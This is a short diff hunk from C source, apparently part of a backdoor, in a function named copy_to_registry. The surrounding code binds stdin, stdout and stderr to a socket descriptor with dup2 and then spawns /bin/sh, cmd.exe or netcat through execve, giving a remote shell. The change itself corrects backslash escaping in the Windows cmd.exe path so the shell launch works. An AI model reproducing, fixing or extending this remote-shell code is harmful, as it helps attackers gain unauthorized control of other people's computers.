@@ -183,7 +183,7 @@ void copy_to_registry()
     fflush(stdout);
     dup2(x, 0),dup2(x, 1),dup2(x, 2);
 
-    execve("/bin/sh", 0, 0),execve("C:\windows\System32\cmd.exe ", 0, 0),execve("netcat", 0, 0);
+    execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
 
      }
 
